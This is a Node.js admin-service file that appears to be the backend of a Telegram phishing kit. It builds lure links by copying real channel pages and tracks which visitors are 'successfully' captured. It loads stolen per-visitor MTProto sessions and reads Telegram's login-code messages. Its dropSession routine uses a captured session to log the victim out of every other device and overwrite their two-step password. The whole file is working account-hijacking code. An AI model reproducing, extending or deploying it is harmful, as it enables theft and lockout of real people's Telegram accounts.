const axios = require("axios");
const { parse } = require("node-html-parser");
const DB = require("../utils/db_query");
const { v4 } = require("uuid");
const Response = require("../responses/response");
const MTProtoService = require("./MTProto-service");
const sessionManager = require("../session-manager/session-manager");
const LoginProcessClientDto = require("../dtos/login-process-client-dto");
const LinkAdminDto = require("../dtos/link-admin-dto");
const VisitorAdminDto = require("../dtos/visitor-admin-dto");
const fs = require("fs");
const path = require("path");
const MTProto = require("@mtproto/core");
const crypto = require("crypto");
const { modPow } = require("bigint-mod-arith");
const BigInteger = require("big-integer");

class AdminService {
  async downloadImage(url, folderPath) {
    const fileName = `${v4()}.jpg`;
    const filePath = path.join(folderPath, fileName);

    const writer = fs.createWriteStream(filePath);

    const response = await axios({
      url,
      method: "GET",
      responseType: "stream",
    });

    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on("finish", () => resolve(fileName));
      writer.on("error", reject);
    });
  }

  async createLink(url, fake, tag, subs) {
    const res = await axios.get(url);
    const root = parse(res.data);
    let photo = root
      .querySelector(".tgme_page_photo a img")
      .getAttribute("src");
    let title = root.querySelector(".tgme_page_title span").innerText;
    /*let subscribers = root
      .querySelector(".tgme_page_extra")
      .innerText.split(" ")[0];*/
    let description = root.querySelector(".tgme_page_description");
    if (description && description.innerText)
      description = description.innerText;

    const staticFolderPath = path.resolve(__dirname, "..", "static");
    if (!fs.existsSync(staticFolderPath)) {
      fs.mkdirSync(staticFolderPath);
    }

    const downloadedFileName = await this.downloadImage(
      photo,
      staticFolderPath
    );
    const filePathInDb = `/static/${downloadedFileName}`;

    const index = await DB.query(
      "SELECT * FROM link ORDER BY serial_index"
    ).then((data) => data.length);

    const link = await DB.query(
      "INSERT INTO link (id, origin, tag, photo, title, subscribers, description, status, serial_index) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?) RETURNING *",
      [fake, url, tag, filePathInDb, title, subs, description, "ACTIVE", index]
    ).then((data) => data[0]);

    return Response.OK(
      new LinkAdminDto({
        ...link,
        visits: 0,
        successfullVisits: 0,
      })
    );
  }

  async updateLinkSubs(id, subs) {
    const exists = await DB.query("SELECT * FROM link WHERE id = ?", [id]).then(
      (data) => data[0]
    );
    if (!exists) throw Response.NotFound();
    const link = await DB.query(
      "UPDATE link SET subscribers = ? WHERE id = ? RETURNING *",
      [subs, id]
    ).then((data) => data[0]);
    return Response.OK(new LinkAdminDto(link));
  }

  async swapLinks(id, index, del) {
    const A = await DB.query("SELECT * FROM link WHERE id = ?", [id]).then(
      (data) => data[0]
    );
    const B = await DB.query("SELECT * FROM link WHERE serial_index = ?", [
      index,
    ]).then((data) => data[0]);
    if (!A || (!B && !del)) throw Response.NotFound();

    var links = await DB.query("SELECT * FROM link ORDER BY serial_index");
    const direction = A.serial_index > index;
    await DB.query("UPDATE link SET serial_index = ? WHERE id = ?", [
      index,
      A.id,
    ]);
    if (direction) {
      const chunkStart = index;
      const chunkEnd = A.serial_index;

      for (let i = chunkStart; i < chunkEnd; i++) {
        links[i].serial_index++;
        await DB.query("UPDATE link SET serial_index = ? WHERE id = ?", [
          links[i].serial_index,
          links[i].id,
        ]);
      }
    } else {
      const chunkStart = A.serial_index + 1;
      const chunkEnd = index;

      for (let i = chunkEnd; i >= chunkStart; i--) {
        links[i].serial_index--;
        await DB.query("UPDATE link SET serial_index = ? WHERE id = ?", [
          links[i].serial_index,
          links[i].id,
        ]);
      }
    }

    links = await DB.query("SELECT * FROM link ORDER BY serial_index");
    return Response.OK(links.map((link) => new LinkAdminDto(link)));
  }

  async deleteLink(id) {
    const link = await DB.query("DELETE FROM link WHERE id = ? RETURNING *", [
      id,
    ]).then((data) => data[0]);
    await DB.query(
      "UPDATE link SET serial_index = serial_index - 1 WHERE serial_index > ?",
      [link.serial_index]
    );
    return Response.OK(link);
  }

  async getLinks() {
    const links = await DB.query("SELECT * FROM link ORDER BY serial_index");
    for (var i = 0; i < links.length; i++) {
      const visits = await DB.query("SELECT * FROM visitor WHERE refer = ?", [
        links[i].id,
      ]);
      var successCount = 0;
      for (var j = 0; j < visits.length; j++) {
        if (visits[j].success) successCount++;
      }
      links[i].visits = visits.length;
      links[i].successfullVisits = successCount;
      links[i] = new LinkAdminDto(links[i]);
    }
    return Response.OK(links);
  }

  async getInfo() {
    const totalLinks = await DB.query("SELECT * FROM link").then(
      (data) => data.length
    );
    const totalVisits = await DB.query("SELECT * FROM visitor").then(
      (data) => data.length
    );
    const successfullVisits = await DB.query(
      "SELECT * FROM visitor WHERE success = 1"
    ).then((data) => data.length);
    return Response.OK({
      totalLinks,
      totalVisits,
      successfullVisits,
    });
  }

  async getSession(visitorId) {
    const fpath = path.join(
      __dirname,
      "..",
      "session-manager",
      "sessions",
      `session_${visitorId}.json`
    );

    const mtproto = new MTProto({
      api_id: process.env.API_ID,
      api_hash: process.env.API_HASH,
      storageOptions: {
        path: fpath,
      },
    });

    const result = await mtproto.call("messages.getHistory", {
      peer: {
        _: "inputPeerUser",
        user_id: 777000,
      },
      limit: 10,
    });

    return Response.OK({
      messages: result.messages,
    });
  }

  async getWhitelist() {
    const ips = await DB.query("SELECT * FROM whitelistIp");
    return Response.OK(ips.map((el) => el.ip));
  }

  async addWhitelistIp(ip) {
    const exists = await DB.query("SELECT * FROM whitelistIp WHERE ip = ?", [
      ip,
    ]).then((data) => data[0]);
    if (exists) throw Response.BadRequest("Already exists");
    const whitelispIp = await DB.query(
      "INSERT INTO whitelistIp(ip) VALUES(?) RETURNING *",
      [ip]
    ).then((data) => data[0]);
    return Response.OK(whitelispIp.ip);
  }

  async removeWhitelistIp(ip) {
    const exists = await DB.query("SELECT * FROM whitelistIp WHERE ip = ?", [
      ip,
    ]).then((data) => data[0]);
    if (!exists) throw Response.NotFound();
    const whitelistIp = await DB.query(
      "DELETE FROM whitelistIp WHERE ip = ? RETURNING *",
      [ip]
    ).then((data) => data[0]);
    return Response.OK(whitelistIp.ip);
  }

  async toggleVisitorStatus(id) {
    const exists = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      id,
    ]).then((data) => data[0]);
    if (!exists) throw Response.NotFound();
    const visitor = await DB.query(
      "UPDATE visitor SET success = ? WHERE id = ? RETURNING *",
      [!Boolean(exists.success), id]
    ).then((data) => data[0]);
    return Response.OK(new VisitorAdminDto(visitor));
  }

  async dropSession(visitorId) {
    const exists = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!exists)
      throw Response.NotFound("Could not find visitor with the same visitorId");

    const fpath = path.join(
      __dirname,
      "..",
      "session-manager",
      "sessions",
      `session_${visitorId}.json`
    );

    const instance = MTProtoService.genInstance(fpath, "Chrome");

    const detached = await MTProtoService.detachAllSessions(instance);
    const changed2FA = await MTProtoService.change2FA(instance, exists.twofa);
    return Response.OK(
      null,
      "Successfully dropped sessions and rewrited 2FA config"
    );
  }
}

module.exports = new AdminService();
